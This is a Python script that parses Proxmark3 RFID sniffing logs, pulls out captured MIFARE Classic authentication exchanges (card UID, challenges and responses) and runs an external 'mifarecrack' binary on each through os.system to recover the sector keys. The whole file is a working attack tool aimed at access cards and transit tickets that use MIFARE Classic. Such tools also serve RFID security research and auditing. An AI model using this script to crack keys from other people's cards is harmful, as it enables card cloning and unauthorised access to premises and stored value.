#!/usr/bin/python3

import sys
import os
import binascii as ba
import struct

DEBUG = False

if len(sys.argv) != 2:
    print("\n\tusage: mifarecrack.py <proxmark3 logfile>\n")
    sys.exit(1)

try:
    with open(sys.argv[1], "rb") as file:
        trace_size = os.path.getsize(sys.argv[1])
        complete_auth_found = False
        while file.tell() <= trace_size:
            auth_code = file.read(2)
            if not auth_code:
                break
            if auth_code == b'\x93\x70':
                # auth found.
                uid = "0x" + ba.b2a_hex(file.read(4)).decode()
                if DEBUG: print(f"addr: {file.tell():x} uid: {uid}")
                
                # jump over select id
                file.read(25)
                use_key = file.read(1)
                # print(use_key)
                if use_key in [b'\x60', b'\x61']:
                    block = struct.unpack("b", file.read(1))[0]
                    key_type = "A" if use_key == b'\x60' else "B"
                    
                    file.read(11)
                   
                    tag_challenge = "0x" + ba.b2a_hex(file.read(4)).decode()

                    file.read(9)
                    reader_challenge = "0x" + ba.b2a_hex(file.read(4)).decode()
                    reader_response = "0x" + ba.b2a_hex(file.read(4)).decode()
                    file.read(7)
                    tag_response_size = struct.unpack("b", file.read(1))[0]
                    if DEBUG: print(f"tag_response_size {tag_response_size}")
                    file.read(1)
                    tag_response = "0x" + ba.b2a_hex(file.read(4)).decode()
                    
                    if tag_response_size != 4 or tag_response == "0x500057cd":
                        if DEBUG: print("Failed Auth found.")
                        if DEBUG: print(f"Block: {block} with key:{key_type}")
                        continue
                    print(f"Section:{block // 4}  Block: {block} with key:{key_type}")
                    if DEBUG: print(f"tag_challenge = {tag_challenge}")
                    if DEBUG: print(f"reader_challenge = {reader_challenge}")
                    if DEBUG: print(f"reader_response = {reader_response}")
                    if DEBUG: print(f"tag_response = {tag_response}")
                    crackstring = f'./mifarecrack {uid} {tag_challenge} {reader_challenge} {reader_response} {tag_response}'
                    print(f'Executing {crackstring}')
                    complete_auth_found = True
                    os.system(crackstring)

        if not complete_auth_found:
            print("No complete auth found!!!")
except IOError:
    print("\nError opening file. Please check the filename or path.\n")
    sys.exit(1)
